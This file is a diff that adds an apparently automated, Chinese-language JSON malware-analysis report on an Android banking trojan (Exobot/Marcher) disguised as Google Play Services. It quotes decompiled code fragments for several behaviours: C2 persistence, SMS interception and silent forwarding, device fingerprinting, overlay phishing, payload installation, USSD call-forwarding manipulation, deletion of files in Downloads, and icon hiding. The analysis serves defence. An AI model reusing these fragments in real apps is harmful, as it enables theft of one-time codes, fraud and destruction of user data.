@@ -1,0 +1,292 @@
+{
+  "APK信息": {
+    "文件名": "b4e5affbc3ea94eb771614550bc83fde85f90caddcca90d25704c9a556f523da.apk",
+    "sha256": "b4e5affbc3ea94eb771614550bc83fde85f90caddcca90d25704c9a556f523da",
+    "包名": "cosmetiq.fl",
+    "应用名": "Google Play Services",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 481.0
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcosmetiq\\fl\\controllers\\activities\\WebMainService;",
+          "method_signature": "onStartCommand(Intent intent, int i, int i2)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public int onStartCommand(Intent intent, int i, int i2) {\n    f2 = (ActivityManager) getSystemService(\"activity\");\n    C0057.m67(this);\n    f0 = getApplicationContext();\n    m0();\n    return 1;\n}\npublic void m0() {\n    new Thread(new RunnableC0033(this)).start();\n}\npublic void onTaskRemoved(Intent intent) {\n    Intent intent2 = new Intent(getApplicationContext(), getClass());\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int i, int i2) {\n>>>         f2 = (ActivityManager) getSystemService(\"activity\");\n>>>         C0057.m67(this);\n>>>         f0 = getApplicationContext();\n>>>         m0();\n>>>         return 1;\n>>>     }\n>>> \n>>>     @Override // android.app.Service\n>>>     public void onTaskRemoved(Intent intent) {\n>>>         Intent intent2 = new Intent(getApplicationContext(), getClass());\n>>>         intent2.setPackage(getPackageName());\n>>>         ((AlarmManager) getApplicationContext().getSystemService(\"alarm\")).set(3, SystemClock.elapsedRealtime() + 1000, PendingIntent.getService(getApplicationContext(), 1, intent2, 1073741824));\n      }\n  }",
+          "behavior_description": "该代码为Exobot(Marcher)银行木马的C2通信服务核心入口。WebMainService被启动时(onStartCommand)，获取ActivityManager用于监控前台应用（为overlay钓鱼攻击做准备），调用C0057.m67初始化C2配置，保存全局ApplicationContext，随后通过m0()启动后台线程RunnableC0033与远程C2服务器建立持久连接，接收指令并回传窃取的数据。返回值1(START_STICKY)使服务被系统杀死后自动重启，onTaskRemoved中再次构造Intent拉起自身服务，形成双重保活机制，确保C2远程控制通道持续在线。数据流向：服务启动事件→初始化C2配置→后台线程建立C2长连接→远程指令下发/数据回传。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lo\\C0063;",
+          "method_signature": "if(strM68.length()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "str = new String(Base64.decode(strM108, 0));\nSmsManager smsManager = SmsManager.getDefault();\nif (strM68.length() > 70) {\n    smsManager.sendMultipartTextMessage(str, null, smsManager.divideMessage(strM68), null, null);\n} else {\n    smsManager.sendTextMessage(str, null, strM68, null, null);\n}\nbroadcastReceiver.abortBroadcast();",
+          "malicious_code_snippet_context": "                  if (strM108 == null) {\n                      str = new String(Base64.decode(string, 0));\n                  } else {\n>>>                     str = new String(Base64.decode(strM108, 0));\n>>>                 }\n>>>                 SmsManager smsManager = SmsManager.getDefault();\n>>>                 if (strM68.length() > 70) {\n>>>                     smsManager.sendMultipartTextMessage(str, null, smsManager.divideMessage(strM68), null, null);\n>>>                 } else {\n>>>                     smsManager.sendTextMessage(str, null, strM68, null, null);\n>>>                 }\n                  broadcastReceiver.abortBroadcast();\n              }\n              if (context.getSharedPreferences(C0032.f187, 0).getBoolean(new String(Base64.decode(\"c21zX2hvb2s=\", 0)), false)) {",
+          "behavior_description": "该代码是 Exobot(Marcher) 银行木马的短信拦截与转发模块。目标手机号通过 Base64 解码获得（来自远程配置 this.f261.m108() 或本地 Base64 字符串），用于隐藏真实发送目标；随后调用 SmsManager 静默发送短信（超过70字符用 sendMultipartTextMessage 分段发送，否则用 sendTextMessage），短信内容 strM68 来自被拦截的 incoming SMS；发送后调用 broadcastReceiver.abortBroadcast() 终止广播，使被拦截的短信（如银行验证码/OTP）不会显示给用户。数据流向：Base64 解码的攻击者配置号码 + 拦截到的短信内容 → SmsManager 静默发送到攻击者指定号码，同时配合 sms_hook 标志触发 AsyncTask 将短信数据（来源地址、时间戳等）上传至 C2 服务器，实现短信验证码窃取和短信欺诈。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcosmetiq\\fl\\services\\receivers\\mess\\ReceiverIncoming;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 11)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (context.getSharedPreferences(C0032.f187, 0).getBoolean(new String(Base64.decode(\"c21zX2hvb2s=\", 0)), false)) {\n    AsyncTaskC0056 asyncTaskC0056 = new AsyncTaskC0056();\n    asyncTaskC0056.m64(context, null, str, displayOriginatingAddress, timestampMillis);\n    asyncTaskC0056.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, voidArr);\n    abortBroadcast();\n}\nif (!context.getSharedPreferences(C0032.f187, 0).getBoolean(new String(Base64.decode(\"c21zX2hvb2tfbm9fYXBp\", 0)), false)) {\n    return;\n}\nC0087.m95(new String(Base64.decode(context.getSharedPreferences(C0032.f187, 0).getString(C0032.f201, \"\"), 0)), str + \" \" + displayOriginatingAddress + \" \" + f8.format(Long.valueOf(timestampMillis)));\nabortBroadcast();",
+          "malicious_code_snippet_context": "      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) throws Throwable {\n          this.mContext = context;\n>>>         if (context.getSharedPreferences(C0032.f187, 0).getBoolean(new String(Base64.decode(\"c21zX2hvb2s=\", 0)), false)) {\n>>>             C0102.m111(context);\n>>>             Object[] objArr = (Object[]) intent.getExtras().get(\"pdus\");\n>>>             ArrayList arrayList = new ArrayList(Arrays.asList(new SmsMessage[objArr.length]));\n>>>             for (Object obj : objArr) {\n>>>                 arrayList.add(SmsMessage.createFromPdu((byte[]) obj));\n>>>             }\n>>>             try {\n>>>                 String str = (String) AuX$.m19(\"o.AuX\").getMethod(\"ˊ\", List.class).invoke(null, arrayList);\n>>>                 String displayOriginatingAddress = ((SmsMessage) arrayList.get(1)).getDisplayOriginatingAddress();\n>>>                 long timestampMillis = ((SmsMessage) arrayList.get(1)).getTimestampMillis();\n                  this.f9 = arrayList;\n                  if (context.getSharedPreferences(C0032.f187, 0).getBoolean(new String(Base64.decode(\"c21zX2hvb2s=\", 0)), false)) {\n                      C0081.m78();",
+          "behavior_description": "该代码位于短信广播接收器中，是Exobot/Marcher银行木马典型的短信拦截模块。代码通过Base64解码读取SharedPreferences中的隐藏开关（'sms_hook'和'sms_hook_no_api'，字符串常量经Base64编码以规避静态检测）。当'sms_hook'开启时，将拦截到的短信内容、发送方号码和时间戳封装进AsyncTask异步上传至C2服务器，随后调用abortBroadcast()中止广播，使系统短信应用和用户无法看到该短信（典型用于窃取银行OTP验证码）。当'sms_hook_no_api'开启时，进一步将短信内容、发送方号码、时间戳拼接后通过C0087.m95（内部调用SmsManager.sendTextMessage）静默转发到攻击者预先配置在SharedPreferences中的号码，并再次abortBroadcast()隐藏痕迹。数据流向：短信广播接收→隐藏短信+网络外传C2+静默短信转发，直接导致用户短信验证码泄露和资费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lo\\AsyncTaskC0069;",
+          "method_signature": "if(line1Number == null)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String line1Number = telephonyManager.getLine1Number();\nif (line1Number == null) { line1Number = \"\"; }\narrayList.add(new BasicNameValuePair(\"info\", \"remote_id: 1, trafferId: \" + string2 + \", imei: \" + telephonyManager.getDeviceId() + \", country: \" + telephonyManager.getNetworkCountryIso() + \", cell: \" + telephonyManager.getSimOperatorName() + \", android: \" + Build.VERSION.RELEASE + \", model: \" + (Build.MANUFACTURER + \" \" + Build.MODEL) + \", number: \" + line1Number + \", applications: android| \" + C0103.m115(context)));",
+          "malicious_code_snippet_context": "                  Context context = this.f271;\n                  String string2 = context.getSharedPreferences(C0032.f187, 0).getString(C0032.f176, C0032.f179);\n                  TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\n>>>                 String line1Number = telephonyManager.getLine1Number();\n>>>                 if (line1Number == null) {\n>>>                     line1Number = \"\";\n                  }\n                  arrayList.add(new BasicNameValuePair(\"info\", \"remote_id: 1, trafferId: \" + string2 + \", imei: \" + telephonyManager.getDeviceId() + \", country: \" + telephonyManager.getNetworkCountryIso() + \", cell: \" + telephonyManager.getSimOperatorName() + \", android: \" + Build.VERSION.RELEASE + \", model: \" + (Build.MANUFACTURER + \" \" + Build.MODEL) + \", number: \" + line1Number + \", applications: android| \" + C0103.m115(context)));\n              } else {",
+          "behavior_description": "该代码是 Exobot(Marcher) 银行木马的设备注册/指纹上报模块。通过 TelephonyManager 采集设备敏感标识：IMEI(getDeviceId)、本机号码、网络国家码、SIM运营商名称，并结合 Build.VERSION.RELEASE、Build.MANUFACTURER/MODEL 获取系统版本与机型，还通过 C0103.m115(context) 枚举已安装应用列表，将上述数据拼接为 'info' 参数（BasicNameValuePair 键值对列表），用于向远程 C2 服务器发起 HTTP POST 上报，实现受害者设备指纹采集与僵尸网络注册。数据流向：TelephonyManager/Build/已安装应用列表 → 拼接字符串 → HTTP POST 参数列表 → 远程C2服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "social_spread",
+      "中文名": "社交蠕虫传播",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_CONTACTS"
+        ],
+        "字符串": [
+          "com.whatsapp",
+          "com.facebook.katana"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lo\\ActivityC0018;",
+          "method_signature": "if(RunnableC0033.f215 != null && RunnableC0033.f215.containsKey(f144)",
+          "malicious_behavior": "social_spread",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (RunnableC0033.f215 != null && RunnableC0033.f215.containsKey(f144)) {\n    HashMap map = new HashMap();\n    map.put(\"com.skype.raider\", \"#E4EEF2\");\n    map.put(\"com.facebook.orca\", \"#627aad\");\n    map.put(\"com.facebook.katana\", \"#627aad\");\n    map.put(\"com.instagram.android\", \"#ECF0F1\");\n    map.put(\"com.viber.voip\", \"#59267c\");\n    map.put(\"com.whatsapp\", \"#455a64\");\n    Color.parseColor((String) map.get(str));\n}\nsetTheme(this.f146 ? R.style._res_0x7f070008 : R.style._res_0x7f070009);\nnew DialogFragmentC0114cOn().show(getFragmentManager(), \"first\");",
+          "malicious_code_snippet_context": "          RunnableC0033.f216 = true;\n          f144 = getIntent().getExtras().getString(C0032.f192);\n          f145 = getSharedPreferences(C0032.f187, 0).getString(C0032.f177, C0032.f179);\n>>>         if (RunnableC0033.f215 != null && RunnableC0033.f215.containsKey(f144)) {\n>>>             this.f146 = !RunnableC0033.f215.get(f144).f229;\n>>>             String str = f144;\n>>>             HashMap map = new HashMap();\n>>>             map.put(\"com.skype.raider\", \"#E4EEF2\");\n>>>             map.put(\"com.facebook.orca\", \"#627aad\");\n>>>             map.put(\"com.facebook.katana\", \"#627aad\");\n>>>             map.put(\"com.instagram.android\", \"#ECF0F1\");\n>>>             map.put(\"com.viber.voip\", \"#59267c\");\n>>>             map.put(\"com.whatsapp\", \"#455a64\");\n>>>             Color.parseColor((String) map.get(str));\n>>>         } else {\n              this.f146 = false;\n          }\n          setTheme(this.f146 ? R.style._res_0x7f070008 : R.style._res_0x7f070009);",
+          "behavior_description": "该代码是Exobot/Marcher银行木马overlay（界面劫持）攻击组件的onCreate逻辑：从SharedPreferences读取C2下发配置，判断目标应用包名f144是否命中远程配置的目标应用列表(RunnableC0033.f215)；命中后按目标社交应用的品牌色（WhatsApp #455a64、Facebook #627aad、Viber #59267c、Instagram、Skype等）对伪造Activity进行主题伪装，使钓鱼界面与被劫持的真实社交应用视觉一致，随后立即弹出伪造对话框诱导用户输入账号凭证。数据流向：C2远程配置+目标应用包名→主题伪装→展示伪造社交应用钓鱼界面；窃取的WhatsApp/Facebook等社交账号凭证可被用于劫持账号并向受害者联系人群发恶意链接，实现社交蠕虫式传播。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lo\\C0093;",
+          "method_signature": "m101(String str)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory().getAbsolutePath(), str)), \"application/vnd.android.package-archive\");\nintent.addFlags(335544320);\nthis.mContext.startActivity(intent);",
+          "malicious_code_snippet_context": "  \n      /* JADX INFO: renamed from: ʻ, reason: contains not printable characters */\n      final void m101(String str) {\n>>>         Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>         intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory().getAbsolutePath(), str)), \"application/vnd.android.package-archive\");\n>>>         intent.addFlags(335544320);\n>>>         this.mContext.startActivity(intent);\n      }\n  }",
+          "behavior_description": "该方法构造 ACTION_VIEW Intent，数据指向外部存储根目录下的 APK 文件（tw.apk，由木马此前通过 AsyncTaskC0003 静默下载到 getExternalStorageDirectory()），MIME 类型设为 application/vnd.android.package-archive，并附加 FLAG_ACTIVITY_NEW_TASK|FLAG_ACTIVITY_CLEAR_TOP 标志后立即启动系统包安装器。数据流向：木马静默下载的 tw.apk 文件 → startActivity() 触发系统安装器弹窗诱导用户安装。该行为是 Exobot(Marcher) 银行木马典型的载荷安装/自我更新机制：安装弹窗由木马逻辑自动拉起（很可能伪装成系统更新提示），用于安装木马新版本或额外恶意组件以维持和扩展感染。虽然最终安装需用户点击确认（非完全静默安装，未使用 pm install/PackageInstaller/root 提权方式），但结合已确认的银行木马背景，属于恶意载荷安装链路的关键环节。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lo\\C0046;",
+          "method_signature": "mo35(Context context, String str, String str2)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\");\nintent.setData(Uri.fromParts(\"tel\", \"##21#\", \"#\"));\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "      @Override // o.InterfaceC0016\n      /* JADX INFO: renamed from: ˊ */\n      public final void mo35(Context context, String str, String str2) {\n>>>         Intent intent = new Intent(\"android.intent.action.CALL\");\n>>>         intent.setFlags(268435456);\n>>>         intent.setData(Uri.fromParts(\"tel\", \"##21#\", \"#\"));\n          context.startActivity(intent);\n          C0004.m38(context, str);\n      }",
+          "behavior_description": "该类是Exobot(Marcher)银行木马指令分发接口InterfaceC0016的实现类（类名经混淆含不可打印字符）。方法使用ACTION_CALL（而非ACTION_DIAL，无需用户确认即可直接发起呼叫）静默拨打USSD代码##21#，用于注销并清除设备上已注册的无条件呼叫转移设置。这是木马呼叫拦截/转移操控能力的一环：攻击者通过C2下发指令触发该回调，配合*21*<号码>#类USSD码将来电转移至攻击者号码以拦截银行验证电话，事后再用##21#抹除转移痕迹。数据流向：C2远程指令（经接口回调触发，USSD码硬编码）→ context.startActivity(ACTION_CALL, tel:##21#) 静默拨号，操纵运营商呼叫转移服务。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcosmetiq\\fl\\services\\LaunchActivity;",
+          "method_signature": "onCreate(Bundle bundle)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "File[] fileArrListFiles = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).listFiles();\nif (fileArrListFiles.length > 0) {\n    for (File file : fileArrListFiles) {\n        file.delete();\n    }\n}",
+          "malicious_code_snippet_context": "          setContentView(R.layout._res_0x7f030000);\n          getApplicationContext().getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);\n          try {\n>>>             File[] fileArrListFiles = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).listFiles();\n>>>             if (fileArrListFiles.length > 0) {\n>>>                 for (File file : fileArrListFiles) {\n>>>                     file.delete();\n>>>                 }\n>>>             }\n          } catch (Exception unused) {\n          }\n          if (!m1()) {",
+          "behavior_description": "该代码位于已确认的 Exobot(Marcher) 银行木马的启动 Activity 中。onCreate 时先通过 setComponentEnabledSetting(getComponentName(), 2, 1) 禁用自身组件以隐藏应用图标，随后枚举外部存储公共下载目录(DIRECTORY_DOWNLOADS)下的全部文件并逐一调用 delete() 删除。数据流向：Environment.getExternalStoragePublicDirectory(DIRECTORY_DOWNLOADS).listFiles() 获取用户下载文件列表 → file.delete() 批量静默删除。这是破坏性文件操作，会直接造成用户下载数据丢失，银行木马常用此手法清除用户下载的安全软件 APK 或竞争样本，属于明确的恶意破坏行为，且无任何用户授权或提示。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcosmetiq\\fl\\services\\LaunchActivity;",
+          "method_signature": "onCreate(Bundle bundle)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getApplicationContext().getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);\nFile[] fileArrListFiles = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).listFiles();\nfor (File file : fileArrListFiles) { file.delete(); }",
+          "malicious_code_snippet_context": "      protected void onCreate(Bundle bundle) {\n          super.onCreate(bundle);\n          setContentView(R.layout._res_0x7f030000);\n>>>         getApplicationContext().getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);\n>>>         try {\n>>>             File[] fileArrListFiles = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).listFiles();\n              if (fileArrListFiles.length > 0) {\n                  for (File file : fileArrListFiles) {\n                      file.delete();",
+          "behavior_description": "在 LaunchActivity.onCreate 启动时，立即调用 PackageManager.setComponentEnabledSetting(getComponentName(), 2, 1)，将自身启动器 Activity 组件设置为 COMPONENT_ENABLED_STATE_DISABLED，使应用图标从桌面隐藏，用户无法找到或卸载该应用，这是 Exobot(Marcher) 银行木马典型的图标隐藏手法。随后通过 Environment.getExternalStoragePublicDirectory(DIRECTORY_DOWNLOADS).listFiles() 枚举公共下载目录全部文件并逐个 file.delete() 删除，销毁用户下载数据（疑似清除投放的 APK 安装包及痕迹）。数据流向：getComponentName()/Downloads 目录文件列表 → 禁用组件（隐藏图标）+ 删除文件（破坏数据）。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
